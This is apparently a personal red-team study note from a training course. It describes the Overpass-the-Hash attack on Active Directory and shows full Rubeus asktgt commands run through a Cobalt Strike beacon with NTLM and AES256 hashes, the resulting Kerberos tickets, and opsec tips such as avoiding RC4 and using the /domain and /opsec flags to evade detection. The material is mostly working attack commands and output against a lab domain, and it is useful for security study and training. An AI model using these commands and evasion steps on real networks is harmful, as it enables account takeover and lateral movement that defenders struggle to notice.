
Overpass the hash is a technique which allows us to request a new Kerberos TGT for a user, using their NTLM or AES hash.

Elevated privileges are required to obtain user hashes, but not to actually request a ticket.

## 🖊️ via Rubeus

1) Rubeus `asktgt` has us covered for this task.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 59fc0f884922b4ce376051134c71e22c
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Using domain controller: 10.10.122.10:88

[09/01 10:24:04] [+] received output:
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmj [...snip...] 5pbw==

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jking
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/1/2022 2:23:59 PM
  EndTime                  :  9/2/2022 12:23:59 AM
  RenewTill                :  9/8/2022 2:23:59 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  NytFQCt4OMyeF+BjfPSrbw==
  ASREP (key)              :  59FC0F884922B4CE376051134C71E22C
```

This TGT can then be leveraged via [[Pass the Ticket]].

##### Using AES hash

1) To obtain a TGT encrypted using AES256 (0x12) use the user's AES256 hash instead.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIFuj [...snip...] ljLmlv

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jking
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/1/2022 2:54:36 PM
  EndTime                  :  9/2/2022 12:54:36 AM
  RenewTill                :  9/8/2022 2:54:36 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  BBLSeA9nnaNeYIcHqf787V0m5Znz1ednGMXh9V9aorE=
  ASREP (key)              :  4A8A74DAAD837AE09E9ECC8C2F1B89F960188CB934DB6D4BBEBADE8318AE57C6
```

### ⚠ Opsec

Using an NTLM hash results in a ticket encrypted using RC4 (0x17).  This is considered a legacy encryption type and therefore often stands out as anomalous in a modern Windows environment.

The asktgt command has two optional parameters that we can use to blend in a bit more.

If no `/domain` is specified, Rubeus uses the FQDN of the domain this computer is in.  Instead, we can force it to use the NetBIOS name with `/domain:DEV`.  There is also an `/opsec` flag which tells Rubeus to request the TGT in such a way that results in the Ticket Options being 0x40810010.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```


### Properties
---
📆 created   {{11-02-2024}} 21:21
🏷️ tags: #redteam #crto #activedirectory 

---

